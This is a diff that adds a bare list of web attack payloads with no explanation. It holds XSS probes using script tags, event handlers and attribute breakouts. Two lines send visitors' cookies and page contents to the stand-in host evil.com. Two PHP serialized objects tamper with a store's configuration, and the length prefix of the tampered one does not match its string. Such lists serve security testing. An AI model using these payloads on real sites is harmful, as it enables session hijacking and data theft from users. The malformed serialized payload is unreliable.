@@ -1,0 +1,19 @@
+<script>alert('XSS Attack')</script>
+<img src=x onerror=alert('XSS')>
+<svg onload=alert('XSS')>
+"><script>alert('XSS')</script>
+'><script>alert('XSS')</script>
+
+
+
+
+<script>document.location='http://evil.com?c='+document.cookie</script>
+<script>fetch('http://evil.com/steal?data='+document.body.innerHTML)</script>
+
+
+
+configuration:
+O:11:"StoreConfig":1:{s:8:"currency";s:3:"USD";}
+
+
+O:11:"StoreConfig":1:{s:8:"currency";s:10:"malicious";}
